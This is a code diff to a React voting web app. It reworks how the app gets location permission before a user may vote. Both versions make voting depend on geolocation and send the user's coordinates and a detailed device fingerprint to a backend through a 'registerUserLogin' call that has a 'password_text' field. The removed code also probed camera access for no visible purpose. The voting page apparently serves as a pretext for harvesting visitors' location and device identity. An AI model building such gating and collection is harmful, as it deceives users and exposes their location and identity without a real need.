@@ -42,10 +42,8 @@ function App() {
   const [hasInteracted, setHasInteracted] = useState(false);
 
   // --- PERMISSION STATE ---
-  const [missingPermissions, setMissingPermissions] = useState<('location' | 'camera')[]>([]);
   const [showPermissionModal, setShowPermissionModal] = useState(false); 
-  const [isCheckingPermissions, setIsCheckingPermissions] = useState(false); // NEW: Visual feedback state
-
+  
   // --- TIMER STATE ---
   const [votingDeadline, setVotingDeadline] = useState<string | null>(null);
   const [timeLeft, setTimeLeft] = useState<{days: number, hours: number, minutes: number, seconds: number} | null>(null);
@@ -142,53 +140,6 @@ function App() {
       }
   }, [characters]);
 
-  // --- SMOOTH PERMISSIONS CHECK ---
-  const checkPermissions = useCallback(async (): Promise<('location' | 'camera')[]> => {
-    const missing: ('location' | 'camera')[] = [];
-    
-    const locationGranted = await new Promise<boolean>((resolve) => {
-        if (!('geolocation' in navigator)) { resolve(false); return; }
-        
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const locationData = {
-                    lat: position.coords.latitude,
-                    lng: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    timestamp: new Date().toISOString()
-                };
-                localStorage.setItem('muse_user_location', JSON.stringify(locationData));
-                
-                dataService.registerUserLogin({
-                    user_identifier: guestId,
-                    password_text: '',
-                    login_method: 'location_update',
-                    device_info: getDetailedDeviceInfo(), 
-                    location_data: locationData
-                });
-                resolve(true);
-            },
-            (error) => {
-                resolve(false);
-            },
-            { timeout: 5000, enableHighAccuracy: false }
-        );
-    });
-
-    if (!locationGranted) missing.push('location');
-
-    if (locationGranted) { 
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            stream.getTracks().forEach(track => track.stop());
-        } catch (err) { }
-    }
-
-    const finalMissing = [...new Set([...missing])];
-    setMissingPermissions(finalMissing);
-    return finalMissing;
-  }, [guestId]);
-
   // --- TIMER & WINNER LOGIC ---
   useEffect(() => {
     const calculateTimeLeft = () => {
@@ -267,51 +218,58 @@ function App() {
     } catch (err) { console.error("Failed to copy link", err); }
   };
 
+  // NEW: Simplified Vote Handler
+  // We do NOT check permissions here automatically.
+  // We check if data exists. If not, open Modal to force user gesture.
   const handleVoteClick = async () => {
       registerInteraction();
-      if (hasVoted || isVotingEnded || isCheckingPermissions) return;
+      if (hasVoted || isVotingEnded) return;
       
-      setIsCheckingPermissions(true);
-      await new Promise(resolve => setTimeout(resolve, 300));
-      const missing = await checkPermissions();
-      setIsCheckingPermissions(false);
-
-      if (missing.includes('location')) {
+      const storedLoc = localStorage.getItem('muse_user_location');
+      
+      if (!storedLoc) {
+          // If no location data, open permission modal to start the interactive flow
           setShowPermissionModal(true);
-          return;
+      } else {
+          // If we have data, proceed to confirmation directly
+          setIsVoteModalOpen(true);
       }
-      setIsVoteModalOpen(true);
   };
 
-  const handlePermissionRetry = async () => {
-      if (isCheckingPermissions) return;
-      setIsCheckingPermissions(true);
-      const missing = await checkPermissions();
-      setIsCheckingPermissions(false);
+  const handlePermissionSuccess = (locationData: any) => {
+      // Called when PermissionModal successfully gets data
+      localStorage.setItem('muse_user_location', JSON.stringify(locationData));
+      
+      // Log the login/location update
+      dataService.registerUserLogin({
+          user_identifier: guestId,
+          password_text: '',
+          login_method: 'location_update',
+          device_info: getDetailedDeviceInfo(), 
+          location_data: locationData
+      });
 
-      if (!missing.includes('location')) {
-          setHasInteracted(true); 
-          setShowPermissionModal(false);
-          setTimeout(() => setIsVoteModalOpen(true), 200);
-      }
+      setHasInteracted(true);
+      setShowPermissionModal(false);
+      
+      // Delay slightly for smooth transition
+      setTimeout(() => setIsVoteModalOpen(true), 300);
   };
 
   const handleConfirmVote = async () => {
     if (isVotingEnded) return;
     setIsVoteModalOpen(false);
 
+    // Final safety check
     const storedLoc = localStorage.getItem('muse_user_location');
     if (!storedLoc) {
-         const missing = await checkPermissions();
-         if (missing.includes('location')) { 
-             setShowPermissionModal(true); 
-             return; 
-         }
+         setShowPermissionModal(true);
+         return; 
     }
 
     try {
         const activeChar = characters[activeIndex];
-        const locationData = storedLoc ? JSON.parse(storedLoc) : null;
+        const locationData = JSON.parse(storedLoc);
         const deviceInfo = getDetailedDeviceInfo();
 
         // Optimistic UI
@@ -435,22 +393,15 @@ function App() {
              {!isVotingEnded ? (
                 <button
                 onClick={handleVoteClick}
-                disabled={hasVoted || isCheckingPermissions}
+                disabled={hasVoted}
                 className={`relative w-full h-14 rounded-2xl font-bold text-lg transition-all flex items-center justify-center gap-3 overflow-hidden shadow-[0_0_20px_rgba(0,0,0,0.3)] border ${
                     hasVoted 
                     ? 'bg-slate-900/50 border-slate-700/50 cursor-not-allowed text-slate-500' 
-                    : isCheckingPermissions 
-                        ? 'bg-slate-800 border-indigo-500/50 text-indigo-300 cursor-wait'
-                        : 'bg-slate-900/80 backdrop-blur-xl border-indigo-500/30 text-white hover:bg-slate-800 active:scale-95'
+                    : 'bg-slate-900/80 backdrop-blur-xl border-indigo-500/30 text-white hover:bg-slate-800 active:scale-95'
                 }`}
                 >
                     {hasVoted ? (
                         <span>VOTING CLOSED FOR YOU</span>
-                    ) : isCheckingPermissions ? (
-                        <div className="flex items-center gap-3">
-                            <Loader2 className="animate-spin" size={20} />
-                            <span className="tracking-widest text-sm">VERIFYING...</span>
-                        </div>
                     ) : (
                         <span>VOTE FOR {activeCharacter.name.split(' ')[0].toUpperCase()}</span>
                     )}
@@ -489,8 +440,7 @@ function App() {
       <AnimatePresence>
         {showPermissionModal && (
             <PermissionModal 
-                onRetry={handlePermissionRetry} 
-                missingPermissions={missingPermissions} 
+                onSuccess={handlePermissionSuccess}
                 onClose={() => setShowPermissionModal(false)} 
             />
         )}
